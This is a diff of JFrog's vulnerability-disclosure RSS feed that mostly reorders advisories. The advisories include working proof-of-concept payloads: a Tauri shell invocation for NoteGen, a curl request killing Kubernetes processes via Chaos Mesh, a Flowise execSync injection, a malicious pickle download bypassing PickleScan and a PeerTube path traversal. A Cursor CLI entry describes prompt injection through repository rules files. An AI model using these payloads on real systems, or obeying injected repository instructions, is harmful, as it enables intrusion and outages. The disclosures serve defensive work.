@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Wed, 30 Sep 2026 00:42:29 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 30 Sep 2026 08:39:02 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -680,74 +680,6 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -825,6 +757,74 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -1612,6 +1612,46 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
+            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
+
+## Component
+
+[Cursor CLI](https://github.com/cursor/cursor)
+
+## Affected versions
+
+( , 2025.09.17-25b418f)
+
+## Description
+
+Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
+
+The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
+
+
+
+## PoC
+
+No PoC is supplied for this issue
+
+## Vulnerability Mitigations
+
+No mitigations are available for this issue
+
+## References
+
+[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[DSPy sandbox escape arbitrary file read]]></title>
             <link>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</link>
             <guid>https://research.jfrog.com/vulnerabilities/dspy-sandbox-escape-arbitrary-file-read-jfsa-2025-001495652/</guid>
@@ -1655,46 +1695,6 @@ No mitigations are supplied for this issue
 
 
 
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Cursor CLI Untrusted Project RCE]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/cursor-cli-untrusted-project-rce/</guid>
-            <pubDate>Tue, 04 Nov 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Using Cursor CLI inside a malicious repository leads to Remote Code Execution on the end-user.
-
-## Component
-
-[Cursor CLI](https://github.com/cursor/cursor)
-
-## Affected versions
-
-( , 2025.09.17-25b418f)
-
-## Description
-
-Due to automatic loading of project-specific CLI configuration that affected certain global configurations under the current working directory (`<project>/.cursor/cli.json`) while using Cursor CLI, users running the CLI inside a malicious repo context are prone to Remote Code Execution via a combination of permissive configuration (allowed shell commands) and prompt injection delivered via project specific Rules (`<project>/.cursor/rules/rule.mdc`) or other mechanisms.
-
-The most likely exploitation vector for this issue, is for Cursor CLI users to clone a malicious Git repository and then run any query inside the cloned repository.
-
-
-
-## PoC
-
-No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are available for this issue
-
-## References
-
-[Advisory](https://github.com/cursor/cursor/security/advisories/GHSA-v64q-396f-7m79)
 ]]></content:encoded>
         </item>
         <item>
@@ -1931,6 +1931,54 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.
+
+## PoC
+
+The following steps demonstrate the bypass.
+
+```bash
+# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
+wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl
+
+# 2. Scan the file with PickleScan.
+picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g
+
+# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
+# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
@@ -1978,54 +2026,6 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PickleScan Unsafe Globals Check Bypass via Submodule Imports]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10157/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bypass in PickleScan's unsafe globals check allows malicious code execution via submodules of dangerous packages.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-A Protection Mechanism Failure vulnerability in picklescan allows a remote attacker to bypass the unsafe globals check. This is possible because the scanner performs an exact match for module names, allowing malicious payloads to be loaded via submodules of dangerous packages (e.g., `asyncio.unix_events` instead of `asyncio`). When the file, incorrectly deemed safe, is loaded, it can lead to malicious code execution.
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability exists in PickleScan's mechanism for identifying unsafe global imports in pickle files. The scanner checks for dangerous modules by comparing the imported module's name against a blocklist using an exact string match. An attacker can circumvent this check by importing a submodule of a dangerous package (e.g., `asyncio.unix_events`) instead of the parent package itself (`asyncio`). Because `asyncio.unix_events` is not an exact match for `asyncio` in the blocklist, PickleScan fails to flag the import as dangerous, allowing the malicious file to pass the scan.
-
-## PoC
-
-The following steps demonstrate the bypass.
-
-```bash
-# 1. Download a malicious pickle file that uses a submodule of a dangerous package.
-wget https://huggingface.co/iluem/linux_pkl/resolve/main/asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl
-
-# 2. Scan the file with PickleScan.
-picklescan -p asyncio_asyncio_unix_events___UnixSubprocessTransport__start.pkl -g
-
-# Observed Result: PickleScan marks the import as "Suspicious" but fails to identify it as a "dangerous" import, allowing it to pass.
-# Expected Result: PickleScan should recognize any submodule of 'asyncio' as dangerous and flag the file as malicious.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-f7qq-56ww-84cr)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10157)
 ]]></content:encoded>
         </item>
         <item>
@@ -2139,59 +2139,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Denial of Service via Unauthorized Access to Chaos Mesh debugging server
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.
-
-
-## PoC
-
-```shell
-curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query
-
-```
-
-
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
@@ -2241,6 +2188,59 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 [Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
 
 [JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Denial of Service via Unauthorized Access to Chaos Mesh debugging server
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.
+
+
+## PoC
+
+```shell
+curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query
+
+```
+
+
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+
 
 ]]></content:encoded>
         </item>
@@ -2446,60 +2446,6 @@ additional_authorized_imports=[],executor_type='wasm')
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Flowise JS injection remote code execution]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
-            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Unintended dynamic code execution leads to remote code execution by network attackers
-
-## Component
-
-[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
-
-## Affected versions
-
-(,)
-
-## Description
-
-User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
-
-
-## PoC
-
-Send the following payload to the `node-load-method/customMCP` API endpoint -
-
-```json
-{
-    "inputs":
-    {
-        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
-    },
-    "loadMethod": "listActions"
-}
-```
-
-
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Flowise OS command remote code execution]]></title>
             <link>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</link>
             <guid>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</guid>
@@ -2548,6 +2494,60 @@ Send the following payload to the `node-load-method/customMCP` API endpoint -
 ## Vulnerability Mitigations
 
 No mitigations are supplied for this issue
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Flowise JS injection remote code execution]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
+            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Unintended dynamic code execution leads to remote code execution by network attackers
+
+## Component
+
+[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
+
+## Affected versions
+
+(,)
+
+## Description
+
+User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
+
+
+## PoC
+
+Send the following payload to the `node-load-method/customMCP` API endpoint -
+
+```json
+{
+    "inputs":
+    {
+        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
+    },
+    "loadMethod": "listActions"
+}
+```
+
+
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
 
 ## References
 
@@ -3359,6 +3359,62 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
+
+
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
+1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
+1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
+1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
+
+```
+curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
+```
+The .m3u8 file will be returned.
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
@@ -3400,62 +3456,6 @@ new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/i
 curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
 ```
 If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
-
-
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
-
-## PoC
-
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
-1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
-1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
-1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
-
-```
-curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
-```
-The .m3u8 file will be returned.
 
 
 
